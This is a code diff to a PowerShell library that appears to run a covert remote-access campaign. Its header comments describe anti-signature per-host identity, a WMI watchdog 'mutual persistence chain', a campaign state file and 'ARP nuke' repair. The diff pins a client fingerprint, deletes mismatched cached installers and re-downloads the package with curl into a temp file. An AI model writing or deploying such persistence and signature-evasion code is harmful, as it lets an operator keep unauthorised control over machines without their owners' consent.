@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L24
+# OWN_LIB  BUILD 20260802L25
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L24: GryxaExpectedFp pin — rotate FP => hosts migrate to new FP (fixes only-1-connects).
+# L25: expected FP pinned 36e506ff016b2151; cached MSI invalidated when FP mismatches.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -339,7 +339,7 @@ $script:GryxaUiHost = 'ui.gryxa.com'
 $script:SevrzKeep = @('5f6010579852e507', 'f861c8140d453427')
 # Set to a 16-hex FP you WANT installed (after rotating on the panel). Any host
 # running a different FP migrates to this one. Leave '' to just track whatever runs.
-$script:GryxaExpectedFp = ''
+$script:GryxaExpectedFp = '36e506ff016b2151'
 
 function Get-GryxaCfgPath { Join-Path $WorkDir 'gryxa.cfg' }
 
@@ -497,7 +497,13 @@ function Uninstall-ScFingerprint([string]$Fingerprint) {
 
 function Get-GryxaMsi {
     $msi = Join-Path $WorkDir 'pkg_gryxa.msi'
-    if ((Test-Path $msi) -and ((Get-Item $msi).Length -gt 1000000)) { return $msi }
+    # When an FP is pinned, the cached MSI must match it; otherwise refetch.
+    if ((Test-Path $msi) -and ((Get-Item $msi).Length -gt 1000000)) {
+        if (-not $script:GryxaExpectedFp) { return $msi }
+        $cachedFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
+        if ($cachedFp -eq $script:GryxaExpectedFp) { return $msi }
+        Remove-Item -LiteralPath $msi -Force -ErrorAction SilentlyContinue
+    }
     $tmp = Join-Path $env:TEMP ("sc_gryxa_{0}.msi" -f [guid]::NewGuid().ToString('N'))
     try {
         $curl = Join-Path $env:SystemRoot 'System32\curl.exe'
